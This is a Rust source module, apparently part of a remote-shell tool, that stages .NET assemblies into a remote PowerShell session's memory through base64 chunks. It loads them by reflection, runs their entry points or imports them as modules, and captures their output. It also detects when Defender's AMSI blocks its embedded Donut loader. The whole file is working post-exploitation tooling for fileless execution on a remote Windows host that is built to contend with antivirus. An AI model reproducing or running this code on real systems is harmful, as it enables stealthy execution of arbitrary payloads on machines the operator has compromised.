//! Existing managed assembly staging and invocation helpers.
use crate::{command::quote, session::Session};
use anyhow::{Context, Result};
use base64::{Engine, engine::general_purpose::STANDARD as B64};
use std::{fs::File, io::Read, path::Path};
pub(super) async fn stage_bytes(session: &Session, path: &Path) -> Result<String> {
    let id = format!("ewr{}", uuid::Uuid::new_v4().simple());
    let mut file = File::open(path).with_context(|| format!("opening {}", path.display()))?;
    session
        .raw(&format!("$global:{id} = New-Object IO.MemoryStream"))
        .await?;
    let result = async {
        let mut buffer = [0; 48 * 1024];
        loop {
            let n = file.read(&mut buffer)?;
            if n == 0 {
                break;
            }
            session
                .raw(&format!(
                    "$b = [Convert]::FromBase64String('{}'); $global:{id}.Write($b,0,$b.Length)",
                    B64.encode(&buffer[..n])
                ))
                .await?;
        }
        Ok::<_, anyhow::Error>(())
    }
    .await;
    if let Err(error) = result {
        unstage_bytes(session, &id).await;
        return Err(error);
    }
    Ok(id)
}
pub(super) async fn unstage_bytes(session: &Session, id: &str) {
    let _=session.raw(&format!("$global:{id}.Dispose(); Remove-Variable -Name {id} -Scope Global -ErrorAction SilentlyContinue")).await;
}

/// Recognize the CLR error raised when Defender's AMSI integration rejects the
/// embedded Donut loader before it can be hosted.
pub(super) fn donut_loader_blocked_by_amsi(error: &anyhow::Error) -> bool {
    let message = format!("{error:#}").to_ascii_lowercase();
    message.contains("incorrect format")
        || message.contains("badimageformat")
        || message.contains("could not load file or assembly")
}

pub(super) async fn load_assembly(
    session: &Session,
    path: &Path,
    dll: bool,
    args: &[String],
) -> Result<String> {
    let id = stage_bytes(session, path).await?;
    let result = async {
        let load = format!("$a = [Reflection.Assembly]::Load($global:{id}.ToArray());");
        if dll { session.raw(&format!("{load} Import-Module -Assembly $a -ErrorAction Stop; $a.GetName().Name")).await }
        else {
            let args = args.iter().map(|a|quote(a)).collect::<Vec<_>>().join(",");
            session.raw(&format!("{load} $entry = $a.EntryPoint; if (!$entry) {{ throw 'assembly has no entry point' }}; $writer = New-Object IO.StringWriter; $previous = [Console]::Out; $previousError = [Console]::Error; try {{ [Console]::SetOut($writer); [Console]::SetError($writer); if ($entry.GetParameters().Count -eq 0) {{ $return = $entry.Invoke($null,$null) }} else {{ $return = $entry.Invoke($null, [object[]](,[string[]]@({args}))) }}; if ($return -is [Threading.Tasks.Task]) {{ $return.GetAwaiter().GetResult() }} }} finally {{ [Console]::SetOut($previous); [Console]::SetError($previousError); $writer.ToString(); $writer.Dispose() }}")).await
        }
    }.await;
    unstage_bytes(session, &id).await;
    result
}
